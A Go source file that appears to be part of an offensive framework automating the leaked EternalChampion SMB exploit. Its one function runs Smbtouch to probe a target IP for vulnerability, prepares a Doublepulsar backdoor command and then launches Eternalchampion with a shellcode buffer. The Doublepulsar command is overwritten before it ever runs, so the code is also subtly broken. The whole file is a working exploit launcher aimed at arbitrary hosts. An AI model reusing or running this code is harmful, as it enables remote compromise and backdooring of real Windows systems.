package exploits

import (
	"eternal/conf"
	"eternal/metadatas"
	"eternal/utils"
	"fmt"
	"os/exec"
	"path/filepath"
)

func EternalChampion() {
	if BackDoorCheck() {
		return
	}
	filename := filepath.Join(metadatas.MetaData.LogDir, metadatas.MetaData.ProjectName, utils.CreateXmlFileName("Smbtouch"))
	cmd := exec.Command(conf.Touches+"Smbtouch-1.1.1.exe", "--InConfig", conf.Touches+"Smbtouch-1.1.1.0.xml", "--OutConfig", filename, "--TargetIp", metadatas.MetaData.TargetIp, "--TargetPort", metadatas.MetaData.TargetPort, "--Protocol", metadatas.MetaData.Protocol, "--NetworkTimeout", metadatas.MetaData.NetworkTimeout)
	utils.Execute(cmd)
	results := utils.ParseSmbXml(filename)
	if results == nil {
		fmt.Println(utils.ColorPrint(-1, "Not Vuln."))
		return
	}
	metadatas.MetaData.SetOutputInstall()
	metadatas.MetaData.SetArch()
	cmd = exec.Command(filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.exe"), "--InConfig", filepath.Join(conf.Payloads, "Doublepulsar-1.3.1.0.xml"), "--OutConfig", filepath.Join(metadatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metadatas.MetaData.TargetIp, "--Architecture", metadatas.MetaData.Arch, "--TargetPort", metadatas.MetaData.TargetPort, "--Target", metadatas.MetaData.Target, "--NetworkTimeout", metadatas.MetaData.NetworkTimeout, "--Function", metadatas.MetaData.Function, "--OutputFile", metadatas.MetaData.OutputInstall)
	cmd = exec.Command(filepath.Join(conf.Specials, "Eternalchampion-2.0.0.exe"), "--InConfig", filepath.Join(conf.Specials, "Eternalchampion-2.0.0.0.xml"), "--OutConfig", filepath.Join(metadatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metadatas.MetaData.TargetIp, "--TargetPort", metadatas.MetaData.TargetPort, "--Target", results["Target"], "--NetworkTimeout", metadatas.MetaData.NetworkTimeout, "--Protocol", results["Protocol"], "--PipeName", results["PipeName"], "--TargetOsArchitecture", results["TargetOsArchitecture"], "--Credentials", results["Credentials"], "--ShareName", results["ShareName"], "--ShellcodeBuffer", metadatas.MetaData.ShellcodeBuffer)
	metadatas.MetaData.ShowMetaData()
	utils.Execute(cmd)
}
